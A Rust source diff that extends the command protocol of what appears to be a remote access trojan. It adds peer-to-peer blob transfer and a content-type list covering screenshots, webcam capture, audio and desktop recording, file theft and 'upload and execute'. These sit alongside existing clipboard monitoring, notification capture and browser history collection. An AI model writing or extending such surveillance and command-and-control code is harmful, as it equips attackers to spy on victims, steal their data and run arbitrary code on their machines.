@@ -53,6 +53,7 @@ pub enum ServerboundPacket {
     ClipboardUpdate(ClipboardUpdate),
     ClipboardImageUpdate(ClipboardImageUpdate),
     NotificationEvent(NotificationEvent),
+    IrohBlobReady(IrohBlobInfo),
 }
 
 impl Packet for ServerboundPacket {
@@ -104,6 +105,7 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::ClipboardUpdate(_) => "Clipboard Update",
             ServerboundPacket::ClipboardImageUpdate(_) => "Clipboard Image Update",
             ServerboundPacket::NotificationEvent(_) => "Notification Event",
+            ServerboundPacket::IrohBlobReady(_) => "Iroh Blob Ready",
         }
     }
 }
@@ -192,6 +194,8 @@ pub enum ClientboundPacket {
     StopClipboardMonitor,
     StartNotificationCapture,
     StopNotificationCapture,
+    SetIrohConfig(IrohConfig),
+    IrohDownloadBlob(IrohBlobInfo),
 }
 
 impl Packet for ClientboundPacket {
@@ -282,6 +286,8 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::StopClipboardMonitor => "Stop Clipboard Monitor",
             ClientboundPacket::StartNotificationCapture => "Start Notification Capture",
             ClientboundPacket::StopNotificationCapture => "Stop Notification Capture",
+            ClientboundPacket::SetIrohConfig(_) => "Set Iroh Config",
+            ClientboundPacket::IrohDownloadBlob(_) => "Iroh Download Blob",
         }
     }
 }
@@ -599,4 +605,29 @@ pub struct HistoryEntry {
 pub struct BookmarkEntry {
     pub url: String,
     pub title: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct IrohConfig {
+    pub derp_region: u16,
+    pub server_node_id: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct IrohBlobInfo {
+    pub hash: String, // Hex encoded BLAKE3 hash
+    pub name: String,
+    pub size: u64,
+    pub context: BlobContext,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub enum BlobContext {
+    Screenshot,
+    Webcam,
+    AudioRecording,
+    DesktopRecording,
+    FileDownload,
+    FileUpload,
+    FileUploadAndExecute,
 }
